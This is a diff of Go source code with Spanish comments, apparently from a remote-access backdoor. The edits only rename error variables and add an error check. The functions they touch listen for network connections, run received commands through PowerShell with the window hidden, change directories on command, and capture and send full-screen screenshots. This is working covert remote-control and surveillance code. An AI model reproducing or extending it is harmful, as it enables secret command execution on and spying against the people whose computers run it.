@@ -33,16 +33,16 @@ const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios
 func Enviar_img(conexion net.Conn, archivo string) error {
 	buffer_tamaño := make([]byte, 8)
 
-	imagen, error := os.Open(archivo)
+	imagen, open_error := os.Open(archivo)
 	stat, _ := imagen.Stat() // obtengo stats de la imagen
 
 	buffer_img := make([]byte, stat.Size()) // obtengo el tamaño y creo un buffer
 
-	if error != nil {
+	if open_error != nil {
 		return errors.New("[!] no se encuentra la imagen")
 	}
-	n, error := imagen.Read(buffer_img)
-	if error != nil {
+	n, read_error := imagen.Read(buffer_img)
+	if read_error != nil {
 		return errors.New("[!] error al codificar imagen")
 	}
 	binary.BigEndian.PutUint64(buffer_tamaño, uint64(n))
@@ -64,12 +64,18 @@ func Enviar_img(conexion net.Conn, archivo string) error {
 func Ss(conexion net.Conn) error {
 	nombre := "captura.png"
 	bordes := screenshot.GetDisplayBounds(0)
-	img, error := screenshot.CaptureRect(bordes)
-	if error != nil {
+	img, erro := screenshot.CaptureRect(bordes)
+	if erro != nil {
 
-		return error
+		return erro
 	}
-	arch, error := os.Create(nombre)
+
+	arch, arch_err := os.Create(nombre)
+
+	if arch_err != nil {
+		return arch_err
+	}
+
 	err := png.Encode(arch, img)
 	if err != nil {
 		return err
@@ -87,16 +93,16 @@ func Ss(conexion net.Conn) error {
 
 // funcion que implementa la logica del comando cd
 func Cd(entrada string, cliente net.Conn) {
-	ruta, error := regexp.Compile(`cd (\S+)`)
-	if error != nil {
-		fmt.Println(error)
+	ruta, compile_error := regexp.Compile(`cd (\S+)`)
+	if compile_error != nil {
+		fmt.Println(compile_error)
 	} else {
 		re := ruta.FindStringSubmatch(entrada)
 		if len(re) > 1 && len(re) < 3 {
 			ruta_str := re[1]
 
-			error := os.Chdir(ruta_str)
-			if error != nil {
+			ch_error := os.Chdir(ruta_str)
+			if ch_error != nil {
 				Envio(cliente, []byte("[!] error cambiando ruta"))
 			} else {
 				Envio(cliente, []byte("[*] ruta actualizada"))
@@ -111,8 +117,8 @@ func Ejecucion(entrada string) ([]byte, error) {
 	comando := exec.Command("powershell", "-command", entrada)
 
 	comando.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // ocultar ventana de cmd
-	salida, error := comando.CombinedOutput()
-	return salida, error
+	salida, comb_error := comando.CombinedOutput()
+	return salida, comb_error
 
 }
 
@@ -131,12 +137,13 @@ func Envio(conexion net.Conn, salida []byte) error {
 	return nil
 }
 
+// por cada comando se cierra la conecion y se acepta una nueva
 func Escucha(conn net.Listener) {
 	for {
 
-		cliente, error := conn.Accept()
-		if error != nil {
-			fmt.Println(error)
+		cliente, accept_error := conn.Accept()
+		if accept_error != nil {
+			fmt.Println(accept_error)
 		}
 		Cliente(cliente)
 	}
